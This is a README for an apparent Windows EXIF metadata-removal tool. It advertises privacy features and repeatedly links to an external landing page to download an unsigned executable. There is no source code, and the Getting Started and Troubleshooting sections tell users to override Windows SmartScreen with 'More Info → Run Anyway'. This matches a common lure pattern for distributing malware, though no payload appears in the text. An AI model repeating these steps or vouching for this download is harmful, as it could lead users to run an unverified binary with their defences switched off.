<div align="center">

<img src="assets/banner.svg" width="100%" alt="EXIF Data Cleaner banner"/>

# exif-data-cleaner-tool 🧹🔒

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Strip hidden metadata before it strips your privacy.*

<p align="center">
  <a href="https://Shadowstrage.github.io/exif-data-cleaner-tool/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
  </a>
</p>
</div>

## 📋 Requirements

| Requirement | Detail |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| Memory | 4 GB RAM minimum, 8 GB recommended |
| Disk | 120 MB free space |
| Dependencies | None — standalone executable |
| .NET / Runtime | Bundled, nothing to install separately |
| Permissions | Standard user; admin not required |
| Internet | Not required after download |

---

## 🔍 Overview

Every photo you take carries a hidden passenger. Camera model, GPS coordinates, timestamp down to the second, sometimes even the serial number of the device that captured it — all quietly embedded in the file as EXIF, IPTC, and XMP metadata. **exif-data-cleaner-tool** exists to evict that passenger before your image goes anywhere public. It reads the metadata layer that sits beneath every JPEG, PNG, TIFF, and HEIC file, shows you exactly what's there, and lets you remove it with surgical precision or a single decisive sweep.

This project was built for the people who forward photos, post listings, publish reports, or ship assets — and who understand that metadata leakage is a slow, invisible privacy tax. Journalists protecting sources, sellers scrubbing location data from marketplace photos, businesses sanitizing screenshots before public release, and everyday users who simply don't want their coordinates riding along in a group chat. EXIF data cleaning shouldn't require a terminal, a plugin chain, or blind trust in a browser upload — it should be local, fast, and verifiable.

Unlike browser-based EXIF strippers that require you to upload personal photos to someone else's server, this tool runs entirely on your machine. Nothing leaves your disk. Nothing is logged. Nothing is cached remotely. That's not a marketing line — it's the whole architectural premise.

<p align="center">

<a href="https://Shadowstrage.github.io/exif-data-cleaner-tool/">
  <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
</a>

</p>

---

## 🛠️ What It Actually Does

| Capability | Description |
|---|---|
| **Batch Metadata Purge** | Select a folder, not just a file — every image inside gets cleaned in one pass, recursively if you choose. |
| **Selective Field Removal** | Keep the copyright tag, drop the GPS block — granular control over exactly which metadata fields survive. |
| **Live Metadata Preview** | See the full EXIF/IPTC/XMP tree before touching anything, so you know precisely what you're removing. |
| **Format-Aware Engine** | Handles JPEG, PNG, TIFF, WebP, and HEIC differently, respecting each format's actual metadata container. |
| **Lossless Re-encoding** | Metadata is stripped without recompressing or degrading the original pixel data. |
| **Drag-and-Drop Workflow** | Drop files or folders straight onto the window — no menus required for the common case. |
| **Undo-Safe by Design** | Originals are never overwritten in place unless you explicitly enable that mode. |
| **Command-Free Operation** | Full GUI, zero terminal, zero scripting knowledge required. |

> [!TIP]
> Run a **Preview Scan** first on any new folder. It costs nothing and shows you exactly what metadata exists before you commit to a cleaning pass.

---

## 🚀 Getting Started

1. **Visit the landing page** using the download button above.

2. **Download** the standalone Windows build — no installer wizard, no bundled extras.

3. **Run the executable.** Windows SmartScreen may flag it once; click *More Info → Run Anyway* since the binary is unsigned by design (no publisher fee, no telemetry deal).

4. **Drop your images in** and hit **Clean**. Done.

> [!NOTE]
> First launch creates a local settings file next to the executable. Delete it anytime to reset to defaults — no registry entries, no hidden AppData sprawl.

---

## 🧩 How It Works

The pipeline is deliberately simple: read, parse, decide, write. No cloud round-trip, no background service.

1. **Load** — the file is opened and its container format identified.
2. **Parse** — EXIF/IPTC/XMP segments are extracted into a readable tree.
3. **Filter** — your rules (remove-all, keep-copyright, strip-GPS-only, etc.) are applied.
4. **Rewrite** — a clean copy is written with the original pixel data untouched.
5. **Verify** — a final pass confirms the target fields are actually gone.

```mermaid
flowchart LR
    Load --> Parse
    Parse --> Filter
    Filter --> Rewrite
    Rewrite --> Verify
```

> [!IMPORTANT]
> Verification is not optional in the pipeline — the tool re-reads the output file after cleaning to confirm removal. If verification fails, the original file is left untouched and you're notified.

---

## 🧪 Troubleshooting

<details>
<summary><strong>The app says "file locked" and won't clean an image</strong></summary>

Another program (usually a photo viewer or editor) has the file open with an exclusive handle. Close it and retry.

</details>

<details>
<summary><strong>GPS data is gone from the tool's preview but still shows in another app</strong></summary>

That other app may be reading a cached thumbnail with its own embedded metadata copy. Re-check the actual file on disk, not the thumbnail cache.

</details>

<details>
<summary><strong>HEIC files aren't loading</strong></summary>

Ensure Windows' HEIC codec extension is installed — it's a Microsoft Store component the OS itself needs for HEIC decoding, unrelated to this tool.

</details>

<details>
<summary><strong>Batch clean on a large folder feels slow</strong></summary>

Very large TIFFs with embedded thumbnails take longer to re-encode. Progress is per-file, not per-byte, so large files appear to "stall" — they aren't.

</details>

<details>
<summary><strong>SmartScreen blocked the download</strong></summary>

Expected for an unsigned indie tool. Click *More Info → Run Anyway*. Signing certificates cost money this project doesn't spend on.

</details>

> [!WARNING]
> Cleaning overwrites metadata permanently unless "Keep Originals" is enabled in Settings. Enable it if you're unsure — it costs disk space, not safety.

---

## 🎛️ Interface & Controls

| Shortcut | Action |
|---|---|
| `Ctrl+O` | Open file/folder |
| `Ctrl+Shift+C` | Clean selection |
| `Ctrl+P` | Toggle metadata preview panel |
| `Ctrl+Z` | Revert last clean (if originals kept) |
| `F5` | Refresh folder view |
| `Esc` | Cancel active batch job |

- **Themes:** Light, Dark, and System-Sync (follows Windows theme).

- **Settings persist locally** — no account, no sync, no cloud profile.

- **Progress bar** shows per-file status during batch operations, with a running count of fields removed.

---

## 🤝 Contributing & Community

Bug reports, format edge cases, and pull requests are welcome. Before opening an issue:

- Check existing issues for duplicate reports on the same file format.
- Include a sample file's metadata tree (redact anything sensitive) when reporting a parsing bug.
- Keep PRs scoped — one fix or one feature per PR.

![Contributions](https://img.shields.io/badge/contributions-welcome-brightgreen?style=flat-square) ![Status](https://img.shields.io/badge/status-active-success?style=flat-square) ![Built%20with](https://img.shields.io/badge/built%20with-C%23-239120?style=flat-square&logo=csharp)

> [!TIP]
> Star the repo if this tool saved you from an accidental GPS leak — it genuinely helps the project's visibility and keeps development active.

---

## 📄 License

Released under the [MIT License](LICENSE), 2026. Use it, fork it, ship it inside your own tools — attribution appreciated, not required.

---

## ⚖️ Disclaimer

This tool removes metadata from image files you own or have rights to modify. It does not recover, restore, or reconstruct removed data. Always verify sensitive files independently before public distribution. The maintainers assume no liability for metadata that persists in copies made *before* cleaning, or in platforms that re-embed metadata after upload.

<p align="center">

<a href="https://Shadowstrage.github.io/exif-data-cleaner-tool/">
  <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Build-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
</a>

</p>